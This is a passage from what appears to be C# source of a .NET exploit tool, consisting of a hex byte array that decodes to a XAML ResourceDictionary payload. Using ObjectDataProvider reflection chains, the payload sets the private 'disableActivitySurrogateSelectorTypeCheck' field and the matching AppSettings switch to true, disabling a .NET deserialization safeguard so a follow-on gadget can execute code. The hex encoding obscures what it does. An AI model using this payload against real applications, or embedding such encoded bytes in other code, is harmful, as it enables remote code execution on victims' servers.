	0x78, 0x61, 0x6D, 0x6C, 0x2F, 0x70, 0x72, 0x65, 0x73, 0x65, 0x6E, 0x74, 0x61, 0x74, 0x69, 0x6F,
	0x6E, 0x22, 0x0A, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3A, 0x78, 0x3D, 0x22, 0x68, 0x74, 0x74, 0x70,
	0x3A, 0x2F, 0x2F, 0x73, 0x63, 0x68, 0x65, 0x6D, 0x61, 0x73, 0x2E, 0x6D, 0x69, 0x63, 0x72, 0x6F,
	0x73, 0x6F, 0x66, 0x74, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x77, 0x69, 0x6E, 0x66, 0x78, 0x2F, 0x32,
	0x30, 0x30, 0x36, 0x2F, 0x78, 0x61, 0x6D, 0x6C, 0x22, 0x0A, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3A,
	0x73, 0x3D, 0x22, 0x63, 0x6C, 0x72, 0x2D, 0x6E, 0x61, 0x6D, 0x65, 0x73, 0x70, 0x61, 0x63, 0x65,
	0x3A, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x3B, 0x61, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79,
	0x3D, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x22, 0x0A, 0x78, 0x6D, 0x6C, 0x6E, 0x73,
	0x3A, 0x63, 0x3D, 0x22, 0x63, 0x6C, 0x72, 0x2D, 0x6E, 0x61, 0x6D, 0x65, 0x73, 0x70, 0x61, 0x63,
	0x65, 0x3A, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x43, 0x6F, 0x6E, 0x66, 0x69, 0x67, 0x75,
	0x72, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x3B, 0x61, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x3D,
	0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x43, 0x6F, 0x6E, 0x66, 0x69, 0x67, 0x75, 0x72, 0x61,
	0x74, 0x69, 0x6F, 0x6E, 0x22, 0x0A, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3A, 0x72, 0x3D, 0x22, 0x63,
	0x6C, 0x72, 0x2D, 0x6E, 0x61, 0x6D, 0x65, 0x73, 0x70, 0x61, 0x63, 0x65, 0x3A, 0x53, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x2E, 0x52, 0x65, 0x66, 0x6C, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x3B, 0x61,
	0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x3D, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62,
	0x22, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61,
	0x74, 0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x20, 0x78, 0x3A, 0x4B, 0x65, 0x79,
	0x3D, 0x22, 0x74, 0x79, 0x70, 0x65, 0x22, 0x20, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x54, 0x79,
	0x70, 0x65, 0x3D, 0x22, 0x7B, 0x78, 0x3A, 0x54, 0x79, 0x70, 0x65, 0x20, 0x73, 0x3A, 0x54, 0x79,
	0x70, 0x65, 0x7D, 0x22, 0x20, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64, 0x4E, 0x61, 0x6D, 0x65, 0x3D,
	0x22, 0x47, 0x65, 0x74, 0x54, 0x79, 0x70, 0x65, 0x22, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x3C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72,
	0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x2E, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64, 0x50, 0x61, 0x72,
	0x61, 0x6D, 0x65, 0x74, 0x65, 0x72, 0x73, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x73, 0x3A, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x3E, 0x53,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x57, 0x6F, 0x72, 0x6B, 0x66, 0x6C, 0x6F, 0x77, 0x2E, 0x43,
	0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x4D, 0x6F, 0x64, 0x65, 0x6C, 0x2E, 0x41, 0x70,
	0x70, 0x53, 0x65, 0x74, 0x74, 0x69, 0x6E, 0x67, 0x73, 0x2C, 0x20, 0x53, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x2E, 0x57, 0x6F, 0x72, 0x6B, 0x66, 0x6C, 0x6F, 0x77, 0x2E, 0x43, 0x6F, 0x6D, 0x70, 0x6F,
	0x6E, 0x65, 0x6E, 0x74, 0x4D, 0x6F, 0x64, 0x65, 0x6C, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69,
	0x6F, 0x6E, 0x3D, 0x34, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74,
	0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62,
	0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x33, 0x31, 0x62, 0x66,
	0x33, 0x38, 0x35, 0x36, 0x61, 0x64, 0x33, 0x36, 0x34, 0x65, 0x33, 0x35, 0x3C, 0x2F, 0x73, 0x3A,
	0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x3C, 0x2F, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76,
	0x69, 0x64, 0x65, 0x72, 0x2E, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64, 0x50, 0x61, 0x72, 0x61, 0x6D,
	0x65, 0x74, 0x65, 0x72, 0x73, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x4F, 0x62, 0x6A,
	0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x3E,
	0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61,
	0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x20, 0x78, 0x3A, 0x4B, 0x65, 0x79, 0x3D, 0x22,
	0x66, 0x69, 0x65, 0x6C, 0x64, 0x22, 0x20, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x49, 0x6E, 0x73,
	0x74, 0x61, 0x6E, 0x63, 0x65, 0x3D, 0x22, 0x7B, 0x53, 0x74, 0x61, 0x74, 0x69, 0x63, 0x52, 0x65,
	0x73, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x20, 0x74, 0x79, 0x70, 0x65, 0x7D, 0x22, 0x20, 0x4D, 0x65,
	0x74, 0x68, 0x6F, 0x64, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x47, 0x65, 0x74, 0x46, 0x69, 0x65,
	0x6C, 0x64, 0x22, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x4F, 0x62,
	0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72,
	0x2E, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64, 0x50, 0x61, 0x72, 0x61, 0x6D, 0x65, 0x74, 0x65, 0x72,
	0x73, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C,
	0x73, 0x3A, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x3E, 0x64, 0x69, 0x73, 0x61, 0x62, 0x6C, 0x65,
	0x41, 0x63, 0x74, 0x69, 0x76, 0x69, 0x74, 0x79, 0x53, 0x75, 0x72, 0x72, 0x6F, 0x67, 0x61, 0x74,
	0x65, 0x53, 0x65, 0x6C, 0x65, 0x63, 0x74, 0x6F, 0x72, 0x54, 0x79, 0x70, 0x65, 0x43, 0x68, 0x65,
	0x63, 0x6B, 0x3C, 0x2F, 0x73, 0x3A, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x3E, 0x0A, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x72, 0x3A, 0x42, 0x69, 0x6E,
	0x64, 0x69, 0x6E, 0x67, 0x46, 0x6C, 0x61, 0x67, 0x73, 0x3E, 0x34, 0x30, 0x3C, 0x2F, 0x72, 0x3A,
	0x42, 0x69, 0x6E, 0x64, 0x69, 0x6E, 0x67, 0x46, 0x6C, 0x61, 0x67, 0x73, 0x3E, 0x0A, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61,
	0x74, 0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x2E, 0x4D, 0x65, 0x74, 0x68, 0x6F,
	0x64, 0x50, 0x61, 0x72, 0x61, 0x6D, 0x65, 0x74, 0x65, 0x72, 0x73, 0x3E, 0x0A, 0x20, 0x20, 0x20,
	0x20, 0x3C, 0x2F, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F,
	0x76, 0x69, 0x64, 0x65, 0x72, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x4F, 0x62, 0x6A, 0x65,
	0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x20, 0x78,
	0x3A, 0x4B, 0x65, 0x79, 0x3D, 0x22, 0x73, 0x65, 0x74, 0x22, 0x20, 0x4F, 0x62, 0x6A, 0x65, 0x63,
	0x74, 0x49, 0x6E, 0x73, 0x74, 0x61, 0x6E, 0x63, 0x65, 0x3D, 0x22, 0x7B, 0x53, 0x74, 0x61, 0x74,
	0x69, 0x63, 0x52, 0x65, 0x73, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x20, 0x66, 0x69, 0x65, 0x6C, 0x64,
	0x7D, 0x22, 0x20, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x53,
	0x65, 0x74, 0x56, 0x61, 0x6C, 0x75, 0x65, 0x22, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x3C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F,
	0x76, 0x69, 0x64, 0x65, 0x72, 0x2E, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64, 0x50, 0x61, 0x72, 0x61,
	0x6D, 0x65, 0x74, 0x65, 0x72, 0x73, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x3C, 0x73, 0x3A, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x2F, 0x3E, 0x0A,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x73, 0x3A, 0x42,
	0x6F, 0x6F, 0x6C, 0x65, 0x61, 0x6E, 0x3E, 0x74, 0x72, 0x75, 0x65, 0x3C, 0x2F, 0x73, 0x3A, 0x42,
	0x6F, 0x6F, 0x6C, 0x65, 0x61, 0x6E, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x3C, 0x2F, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76,
	0x69, 0x64, 0x65, 0x72, 0x2E, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64, 0x50, 0x61, 0x72, 0x61, 0x6D,
	0x65, 0x74, 0x65, 0x72, 0x73, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x4F, 0x62, 0x6A,
	0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x3E,
	0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61,
	0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x20, 0x78, 0x3A, 0x4B, 0x65, 0x79, 0x3D, 0x22,
	0x73, 0x65, 0x74, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64, 0x22, 0x20, 0x4F, 0x62, 0x6A, 0x65, 0x63,
	0x74, 0x49, 0x6E, 0x73, 0x74, 0x61, 0x6E, 0x63, 0x65, 0x3D, 0x22, 0x7B, 0x78, 0x3A, 0x53, 0x74,
	0x61, 0x74, 0x69, 0x63, 0x20, 0x63, 0x3A, 0x43, 0x6F, 0x6E, 0x66, 0x69, 0x67, 0x75, 0x72, 0x61,
	0x74, 0x69, 0x6F, 0x6E, 0x4D, 0x61, 0x6E, 0x61, 0x67, 0x65, 0x72, 0x2E, 0x41, 0x70, 0x70, 0x53,
	0x65, 0x74, 0x74, 0x69, 0x6E, 0x67, 0x73, 0x7D, 0x22, 0x20, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64,
	0x4E, 0x61, 0x6D, 0x65, 0x20, 0x3D, 0x22, 0x53, 0x65, 0x74, 0x22, 0x3E, 0x0A, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61,
	0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x2E, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64, 0x50,
	0x61, 0x72, 0x61, 0x6D, 0x65, 0x74, 0x65, 0x72, 0x73, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x73, 0x3A, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67,
	0x3E, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x3A, 0x57, 0x6F, 0x72, 0x6B, 0x66,
	0x6C, 0x6F, 0x77, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x4D, 0x6F, 0x64, 0x65,
	0x6C, 0x3A, 0x44, 0x69, 0x73, 0x61, 0x62, 0x6C, 0x65, 0x41, 0x63, 0x74, 0x69, 0x76, 0x69, 0x74,
	0x79, 0x53, 0x75, 0x72, 0x72, 0x6F, 0x67, 0x61, 0x74, 0x65, 0x53, 0x65, 0x6C, 0x65, 0x63, 0x74,
	0x6F, 0x72, 0x54, 0x79, 0x70, 0x65, 0x43, 0x68, 0x65, 0x63, 0x6B, 0x3C, 0x2F, 0x73, 0x3A, 0x53,
	0x74, 0x72, 0x69, 0x6E, 0x67, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x3C, 0x73, 0x3A, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x3E, 0x74, 0x72, 0x75,
	0x65, 0x3C, 0x2F, 0x73, 0x3A, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x3E, 0x0A, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74,
	0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x2E, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64,
	0x50, 0x61, 0x72, 0x61, 0x6D, 0x65, 0x74, 0x65, 0x72, 0x73, 0x3E, 0x0A, 0x20, 0x20, 0x20, 0x20,
	0x3C, 0x2F, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76,
	0x69, 0x64, 0x65, 0x72, 0x3E, 0x0A, 0x3C, 0x2F, 0x52, 0x65, 0x73, 0x6F, 0x75, 0x72, 0x63, 0x65,
	0x44, 0x69, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x61, 0x72, 0x79, 0x3E, 0x0B
};

		
	}
}